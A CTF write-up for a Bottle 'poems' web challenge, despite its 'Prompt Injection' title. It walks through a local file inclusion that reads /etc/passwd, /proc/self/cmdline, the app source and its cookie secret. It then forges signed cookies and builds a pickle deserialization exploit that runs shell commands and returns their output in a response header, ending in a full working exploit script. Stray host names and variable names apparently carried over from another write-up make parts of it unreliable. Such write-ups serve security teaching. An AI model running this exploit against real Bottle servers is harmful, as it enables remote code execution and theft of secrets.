# Challenge 4: Prompt Injection
Question:I have this collection of poems and whenever I am happy I have a look at them, hope you like it!

![Main Page](https://github.com/PSrujanReddy/OnlineCTF-Writeups/assets/118731259/e6dd751f-acd7-4a08-8db7-277114794bdd)


We are given a link to a website and no source code. Looking at the bottle poem website, we find a lot of links to poems:
```
<ul>
    <li><a class="..." href="/show?id=spring.txt">Spring</a></li>
    <li><a class="..." href="/show?id=Auguries_of_Innocence.txt">Auguries_of_Innocence</a></li>
    <li><a class="..." href="/show?id=The_tiger.txt">The_tiger</a></li>
</ul>
```

![2](https://github.com/PSrujanReddy/OnlineCTF-Writeups/assets/118731259/b9f9bf04-6482-4514-9103-3e4b14039f92)


The `id` parameter looks vulnerable to a local file inclusion attack, so lets test it out by going to a url with a local 
file name in it, like ```http://ch681363157615.ch.eng.run//show?id=/etc/passwd```. This works!

After trying other file locations and known file names without success, I had to find a more reliable way to find the
sourcecode of this website. That’s when I remembered the ```/proc``` filesystem.

Using the file ```/proc/self/cmdline```, we can find out that the commmand currently being executed is the following:

`python3 -u /app/app.py`

By visiting ```http://ch681363157615.ch.eng.run/show?id=/app/app.py``` we get the webserver source:

![1](https://github.com/PSrujanReddy/OnlineCTF-Writeups/assets/118731259/a92a39b9-3658-44b6-ad8d-26d03afbbbcf)

The source Code:

```
from bottle import route, run, template, request, response, error
from config.secret import Vishwa
import os
import re


@route("/")
def home():
    return template("index")


@route("/show")
def index():
    response.content_type = "text/plain; charset=UTF-8"
    param = request.query.id
    if re.search("^../app", param):
        return "No!!!!"
    requested_path = os.path.join(os.getcwd() + "/poems", param)
    try:
        with open(requested_path) as f:
            tfile = f.read()
    except Exception as e:
        return "No This Poems"
    return tfile


@error(404)
def error404(error):
    return template("error")


@route("/sign")
def index():
    try:
        session = request.get_cookie("name", secret=Vishwa)
        if not session or session["name"] == "guest":
            session = {"name": "guest"}
            response.set_cookie("name", session, secret=Vishwa)
            return template("guest", name=session["name"])
        if session["name"] == "admin":
            return template("admin", name=session["name"])
    except:
        return "pls no hax"


if __name__ == "__main__":
    os.chdir(os.path.dirname(__file__))
    run(host="0.0.0.0", port=80)

```
We need to find the config secret to sign a cookie. From the import section, we can infer the folder and filename, so we fetch it:

http://ch681363157615.ch.eng.run/show?id=/app/config/secret.py

We now know the secret that is used to sign cookies:

![Try Hard](https://github.com/PSrujanReddy/OnlineCTF-Writeups/assets/118731259/a9860290-8639-4051-8c7a-61bd7c9b7941)


`Vishwa = "trrrrrrrrrrrrryyyyyyyyyyyharddddddddd" `

# Forging cookies
To actually forge a cookie, we need to know how the ```bottle ```framework signs cookies. To skip that, I just created a small webapp 
locally using the framework and let it set a cookie set with the same secret:

```
from bottle import route, run, response

@route("/")
def index():
    session = {"name": "admin"}
    response.set_cookie("name", session, secret="trrrrrrrrrrrrryyyyyyyyyyyharddddddddd")
    return "Done"

if __name__ == "__main__":
    run(host="0.0.0.0", port=8080)
```
We get a forged cookie for the admin user:

`!rsOwvUb6jllVHQVOPlZv5w==?gAWVFwAAAAAAAACMBG5hbWWUfZRoAIwFYWRtaW6Uc4aULg==`
But when we try to login to the /sign page, it tells us:

```Hello, you are admin, but it’s useless. ```
So, we have to look at something else…

# Searching for another vulnerability

Bottle uses the SimpleTemplate templatig engine and we haven’t looked at the template files yet. Looking at the bottle docs tells us that the default search path is the views/ folder and templates have either a .tpl, .html or no extension):
`
http://ch681363157615.ch.eng.run/show?id=/app/views/index.html
http://ch681363157615.ch.eng.run/show?id=/app/views/guest.html
http://ch681363157615.ch.eng.run/show?id=/app/views/admin.html
`
I didn’t find anything in the template files, so I decided to dive deeper into the cookies.
 
# Pickle RCE

Looking at the relevent bottle source code, we find out they use pickle to serialize the data within the cookie!

We now know the cookie structure:

```"!<base64 encoded hmac>?<base64 encoded pickle blob that contains cookie name & value>"```

The pickle module allows us to abuse a deserialization RCE vulnerability. Since we can forge cookie contents by using the leaked secret key, we can actually exploit this!

To create a malicious cookie, we reuse some code from the bottle framework and add our RCE exploit:
```
import os, hmac, hashlib, base64, pickle

def tob(s, enc='utf8'):
    if isinstance(s, str):
        return s.encode(enc)
    return b'' if s is None else bytes(s)

def touni(s, enc='utf8', err='strict'):
    if isinstance(s, bytes):
        return s.decode(enc, err)
    return str("" if s is None else s)

def create_cookie(name, value, secret):
    encoded = base64.b64encode(pickle.dumps([name, value], -1))
    sig = base64.b64encode(hmac.new(tob(secret), encoded, digestmod=hashlib.sha256).digest())
    value = touni(tob('!') + sig + tob('?') + encoded)
    return value

class PickleRCE(object):
    def __reduce__(self):
        import os
        return (os.system,("ls",))

session = {"name": PickleRCE()}
print(create_cookie("name", session, "trrrrrrrrrrrrryyyyyyyyyyyharddddddddd"))
```
Running the script gives us the following signed cookie.
```
!g7o/7hbTCgAIJqre+u/TkDIC3X1MSA9ACwepauUwzPM=?gAWVMQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFcG9zaXiUjAZzeXN0ZW2Uk5SMBmV4aXQgMZSFlFKUc2Uu
```
This didn’t work though, as we are redirected to the guest template (which can also happen if there is an exception). A closer look at the cookies shows us that the our forged cookie hmac signature length is not the same length as the one we get from the server.
```
# sha256   !GVUngXs7KtEfo0AgW5WZrrtezkJU4EcIKVDZuTVhSfM=?gAWVLQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFcG9zaXiUjAZzeXN0ZW2Uk5SMAmxzlIWUUpRzZS4=
# sha1     !FOWR0RQSmOp1ZQ9J1q5gJfxI2g0=?gAWVMQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFcG9zaXiUjAZzeXN0ZW2Uk5SMBmxzIC1sYZSFlFKUc2Uu
# md5      !1gRqddQMsxxj/bethE9pzg==?gAWVMQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFcG9zaXiUjAZzeXN0ZW2Uk5SMBmxzIC1sYZSFlFKUc2Uu
# actual   !o8siMrdaVf83giE8crJurg==?gAWVFwAAAAAAAACMBG5hbWWUfZRoAIwFZ3Vlc3SUc4aULg==
```
Trying different hashing functions, we find out that the server actually uses md5 in the hmac function, not sha256 as it is used in the GitHub repository.

So, having changed hashlib.sha256 to hashlib.md5, we can use the RCE on against the server. However, we face a new challenge. The template only gets rendered if the cookie value is guest or admin, and not our result (a number, as os.system returns an int), as we can see in the following snippet in the server source code:
```
if not session or session["name"] == "guest":
    session = {"name": "guest"}
    response.set_cookie("name", session, secret=sekai)
    return template("guest", name=session["name"])
if session["name"] == "admin":
    return template("admin", name=session["name"])
```
So, my next idea was to write the output to a file and read it out with the LFI we found in the beginning. As we are likely a user that has very few permissions on the server (shared instance RCE would otherwise be a disaster), I tried to locations that every user likely can write to: /tmp and /dev/shm:
```
# ...
class PickleRCE(object):
    def __reduce__(self):
        import os
        return (os.system,("ls -la > /dev/shm/norelect.txt",))
# ...
```
After creating the cookie and running the exploit, I tried to fetch the command results using the LFI url:

http://bottle-poem.ctf.sekai.team/show?id=/dev/shm/norelect.txt

This works locally, but not on the server. Seems like the admins really locked down the user permissions and disabled the tmpfs.

Searching for another way to get the output back to me, I tried to set a response header from within the RCE:
```
# ...
class PickleRCE(object):
    def __reduce__(self):
        return (exec,("""
from bottle import response
import glob
response.set_header('X-Flag',glob.glob('/*'))
""",))
# ...
```
This works, also on the remote. Success!
```
x-flag: ['/dev', '/opt', '/root', '/media', '/usr', '/tmp', '/srv', '/bin', '/var', '/lib64', '/run', '/sbin', '/mnt', '/sys', '/proc', '/boot', '/home', '/etc', '/lib', '/flag', '/app']
```
We can see a glob match called /flag in our response above.

Trying to read it however fails with a server error.
```
# ...
class PickleRCE(object):
    def __reduce__(self):
        return (exec,("""
from bottle import response
import subprocess,base64
output = subprocess.check_output('ls -la /', shell=True)
response.set_header('X-Flag',base64.b64encode(output))
""",))
# ...
```
By running a shell command with subprocess.check_output, we can execute shell commands and get the stdout back as a string. (Notice how I now base64 encode the output, as it might contain newlines, which are invalid as header values contents)

By running the above shell command, we find out that we can only execute the binary, not read it (Which makes sense, as otherwise it would have been possible to download the flag just by using the LFI vulnerability and some guessing of flag paths, not actually achieving remote code execution):

```
---x--x--x   1 root root  568 Sep 15 06:37 flag
```

So, we use a shell command that runs the binary to get the flag:
```
# ...
class PickleRCE(object):
    def __reduce__(self):
        return (exec,("""
from bottle import response
import subprocess,base64
flag = subprocess.check_output('/flag', shell=True)
response.set_header('X-Flag',base64.b64encode(flag))
""",))
# ...
```

# Full exploit script
```
import base64
import hashlib
import hmac
import pickle
import requests


def tob(s, enc='utf8'):
    if isinstance(s, str):
        return s.encode(enc)
    return b'' if s is None else bytes(s)


def touni(s, enc='utf8', err='strict'):
    if isinstance(s, bytes):
        return s.decode(enc, err)
    return str("" if s is None else s)


def create_cookie(name, value, secret):
    d = pickle.dumps([name, value], -1)
    encoded = base64.b64encode(d)
    sig = base64.b64encode(hmac.new(tob(secret), encoded, digestmod=hashlib.md5).digest())
    value = touni(tob('!') + sig + tob('?') + encoded)
    return value


class PickleRCE(object):
    def __reduce__(self):
        return (exec, ("""
from bottle import response
import subprocess,base64
flag = subprocess.check_output('/flag', shell=True)
response.set_header('X-Flag',base64.b64encode(flag))
""",))


session = {"name": PickleRCE()}
cookie = create_cookie("name", session, "trrrrrrrrrrrrryyyyyyyyyyyharddddddddd")

r = requests.get("https://ch681363157615.ch.eng.run/sign", cookies={"name": cookie})
flag_header = r.headers.get("x-flag")
print(base64.b64decode(flag_header).decode("ascii"))
print(base64.b64decode(r.headers["x-flag"]).decode("ascii"))
```

This will automatically fetch the flag for us. 

![flag](https://github.com/PSrujanReddy/OnlineCTF-Writeups/assets/118731259/f44aa100-c5b5-4678-a25c-4f6a55801536)


Flag:`VishwaCTF{W3lcome_t0_p03m_p0ck3t}`
 

